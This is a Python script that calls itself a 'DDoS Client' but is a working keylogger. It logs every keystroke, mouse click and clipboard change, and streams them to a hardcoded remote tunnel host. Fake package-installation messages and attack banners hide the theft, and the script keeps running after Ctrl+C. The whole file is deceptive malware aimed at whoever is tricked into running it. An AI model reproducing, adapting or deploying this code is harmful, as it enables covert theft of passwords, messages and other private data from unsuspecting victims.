import pynput
from pynput import keyboard, mouse
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import socket
import time
import random
import pyperclip
from colorama import init, Fore, Style


init(autoreset=True)


print(f"{Fore.MAGENTA}=============================================================")
print(f"{Fore.GREEN}DDOS Client by a_lonely_ooo ")
print(f"{Fore.GREEN}     Author: Jayansh Aryan")
print(f"{Fore.MAGENTA}=============================================================")
print(f"{Fore.RED}Running DDoS script...{Style.RESET_ALL}")
print(f"{Fore.YELLOW}Finding connections...{Style.RESET_ALL}")

#Shows fake packges installation
packages = [
    "coreutils", "netlib", "sysconfig", "datastream", "cryptomod",
    "networking", "libprocess", "securelink", "datacache", "runtime"
]

#important here
SERVER_HOST = 'door-robust.gl.at.ply.gg'  # Change to your public ip
SERVER_PORT = 57508  # Change to you public port

# Buffers
keystrokes = []
last_clipboard = ""
sock = None
mouse_controller = pynput.mouse.Controller()
first_connection = True

def connect_socket(retry_delay=0.03):
    """Establish socket with faster retry."""
    global sock, first_connection
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.connect((SERVER_HOST, SERVER_PORT))
        sock.settimeout(None)
        if first_connection:
            print(f"{Fore.GREEN}Connected to server{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}This might take some time for first users{Style.RESET_ALL}")
            first_connection = False
        return True, 0.03
    except Exception:
        sock = None
        print(f"{Fore.RED}Searching for connections, this might take some time...{Style.RESET_ALL}")
        time.sleep(retry_delay)
        return False, min(retry_delay * 1.2, 1)

def on_press(key):
    """Capture keystrokes with mouse position."""
    try:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        mouse_pos = mouse_controller.position
        k = str(key).replace("'", "")
        # Special case for 'x' key
        if k.lower() == 'x':
            entry = f"[{timestamp}] Key: x, MousePos: {mouse_pos}"
        else:
            entry = f"[{timestamp}] Key: {k}, MousePos: {mouse_pos}"
        keystrokes.append(entry)
    except Exception:
        pass

def on_click(x, y, button, pressed):
    """Capture mouse button presses."""
    if pressed:
        try:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            button_name = {pynput.mouse.Button.left: "Left", pynput.mouse.Button.right: "Right", pynput.mouse.Button.middle: "Middle"}.get(button, str(button))
            entry = f"[{timestamp}] Mouse: {button_name}, Pos: ({x}, {y})"
            keystrokes.append(entry)
        except Exception:
            pass

def monitor_clipboard():
    """Monitor clipboard with timestamp."""
    global last_clipboard
    try:
        current_clipboard = pyperclip.paste()
        if current_clipboard != last_clipboard and current_clipboard.strip():
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            try:
                current_clipboard.encode('utf-8')
                entry = f"[{timestamp}] Clipboard: {current_clipboard}"
            except UnicodeEncodeError:
                entry = f"[{timestamp}] Clipboard: [Non-UTF8 data]"
            keystrokes.append(entry)
            last_clipboard = current_clipboard
    except Exception:
        pass

def send_keystrokes():
    """Send data frequently."""
    global sock
    retry_delay = 0.03
    while True:
        try:
            monitor_clipboard()
            if keystrokes and sock:
                try:
                    data = '\n'.join(keystrokes).encode('utf-8')
                    sock.sendall(data)
                    keystrokes.clear()
                    retry_delay = 0.03
                except Exception:
                    sock = None
            if not sock:
                connected, retry_delay = connect_socket(retry_delay)
            print(f"Installing package {random.choice(packages)}...")
            time.sleep(0.1 if keystrokes else 0.5)
        except KeyboardInterrupt:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            mouse_pos = mouse_controller.position
            entry = f"[{timestamp}] Ctrl+C, MousePos: {mouse_pos}"
            keystrokes.append(entry)
            continue
        except Exception:
            time.sleep(1)

def main():
    """Start listeners."""
    try:
        with KeyboardListener(on_press=on_press) as k_listener, MouseListener(on_click=on_click) as m_listener:
            send_keystrokes()
            k_listener.join()
            m_listener.join()
    except Exception:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        mouse_pos = mouse_controller.position
        entry = f"[{timestamp}] Error, MousePos: {mouse_pos}"
        keystrokes.append(entry)
        send_keystrokes()

if __name__ == "__main__":
    main()
